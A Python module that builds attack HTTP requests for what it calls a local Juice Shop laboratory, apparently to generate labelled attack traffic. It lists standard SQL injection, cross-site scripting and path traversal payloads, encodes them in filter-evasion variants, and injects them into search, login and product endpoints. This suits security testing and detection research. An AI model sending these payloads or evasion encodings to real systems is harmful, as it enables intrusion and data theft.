"""Attack request generation and safe encoding variants for a local laboratory."""

from __future__ import annotations

import random
from urllib.parse import quote

from .normal import RequestSpec


FALLBACK_PAYLOADS = [
    "' OR 1=1--",
    "<script>alert(1)</script>",
    "../etc/passwd",
    "UNION SELECT 1,2,3--",
]


def transform_payload(payload: str, rng: random.Random) -> str:
    """Apply one requested transport representation without executing locally."""
    technique = rng.choice(["raw", "url_encoded", "double_url_encoded", "case_alternation"])
    if technique == "url_encoded":
        return quote(payload, safe="")
    if technique == "double_url_encoded":
        return quote(quote(payload, safe=""), safe="")
    if technique == "case_alternation":
        return "".join(char.upper() if index % 2 else char.lower() for index, char in enumerate(payload))
    return payload


def attack_request(payload: str, source: str, rng: random.Random, is_burst: bool = False) -> RequestSpec:
    """Inject one dataset payload into a documented Juice Shop attack surface."""
    value = transform_payload(payload, rng)
    route = rng.choice(["search", "login", "product_path", "multi_param"])
    if route == "search":
        return RequestSpec("GET", "/rest/products/search", {"q": value}, source=source, is_burst=is_burst)
    if route == "login":
        return RequestSpec("POST", "/rest/user/login", json={"email": value, "password": "a"}, source=source, is_burst=is_burst)
    if route == "product_path":
        # quote(..., safe='%') keeps deliberately pre-encoded dataset variants intact.
        return RequestSpec("GET", f"/api/Products/{quote(value, safe='%')}", source=source, is_burst=is_burst)
    return RequestSpec(
        "GET",
        "/rest/products/search",
        {"q": value, "extra": value},
        source=source,
        is_burst=is_burst,
    )
